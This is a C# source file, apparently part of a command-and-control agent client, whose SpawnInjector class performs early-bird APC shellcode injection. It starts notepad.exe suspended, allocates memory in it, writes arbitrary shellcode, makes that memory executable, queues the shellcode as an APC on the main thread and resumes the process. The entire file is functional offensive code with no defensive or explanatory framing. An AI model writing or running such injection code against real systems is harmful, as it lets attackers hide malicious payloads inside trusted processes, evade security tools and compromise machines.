using AgentClient.Infrastructure.Native;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace AgentClient.Application.Services.InjectService
{
    public class SpawnInjector : InjectorService
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var procAttributes = new Kernel32.SECURITY_ATTRIBUTES();
            procAttributes.nLength = Marshal.SizeOf(procAttributes);

            var threadAttributes = new Kernel32.SECURITY_ATTRIBUTES();
            threadAttributes.nLength = Marshal.SizeOf(threadAttributes);

            var startupInfo = new Kernel32.STARTUPINFO();

            Kernel32.PROCESS_INFORMATION processInfo = default;
            try
            {
                if (!Kernel32.CreateProcess(
                    @"C:\Windows\System32\notepad.exe", null,
                    ref procAttributes, ref threadAttributes,
                    false, Kernel32.CreationFlags.CreateSuspended,
                    IntPtr.Zero, @"C:\Windows\System32", ref startupInfo,
                    out processInfo
                    ))
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "Failed to create specified process");
                }

                var baseAddress = Kernel32.VirtualAllocEx(
                    processInfo.hProcess,
                    IntPtr.Zero,
                    shellcode.Length,
                    Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                    Kernel32.MemoryProtection.ReadWrite);

                if (baseAddress == IntPtr.Zero)
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "Failed to allocate memory");
                }

                if (!Kernel32.WriteProcessMemory(
                    processInfo.hProcess,
                    baseAddress,
                    shellcode,
                    shellcode.Length,
                    out _))
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "Failed to write to target process");
                }

                if (!Kernel32.VirtualProtectEx(
                    processInfo.hProcess,
                    baseAddress,
                    shellcode.Length,
                    Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "VirtualProtectEx Failed due to an error");
                }

                var apcResult = Kernel32.QueueUserAPC(baseAddress, processInfo.hThread, 0);
                if (apcResult == 0)
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "QueueUserAPC failed");
                }

                var resume = Kernel32.ResumeThread(processInfo.hThread);
                if (resume == unchecked((uint) -1))
                {
                    var error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(error, "Failed to resume target thread");
                }

                return true;

            }
            finally
            {
                if (processInfo.hThread != IntPtr.Zero)
                {
                    Kernel32.CloseHandle(processInfo.hThread);
                }
                if (processInfo.hProcess != IntPtr.Zero)
                {
                    Kernel32.CloseHandle(processInfo.hProcess);
                }
            }
        }
    }
}
